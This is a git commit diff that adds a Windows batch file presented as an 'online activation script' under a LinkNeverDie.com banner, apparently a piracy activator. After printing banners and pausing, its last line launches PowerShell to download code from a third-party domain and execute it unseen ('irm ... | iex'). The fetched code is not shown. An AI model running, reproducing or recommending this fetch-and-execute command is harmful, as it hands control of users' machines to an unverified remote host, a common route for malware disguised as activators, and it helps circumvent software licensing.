ebf4d105c00e15c476fac1fb86d7dcd068faab94
Banmkh6 <banmkh6@gmail.com>
2024-09-18 13:50:28 +0700

    added new activation tools

---
+++ Online.Activation.Script/Online.Activation.Script.bat
@@ -0,0 +1,10 @@
+ÿþ&cls
+@ECHO OFF
+Echo:====================================
+Echo:========= LinkNeverDie.Com =========
+Echo:====================================
+Echo  Online activation script mode
+ping 127.0.0.1 -n 2 > nul
+Echo Starting...
+ping 127.0.0.1 -n 4 > nul
+start powershell -Command "irm https://api.taolaovl.com/api/onlineactive | iex"
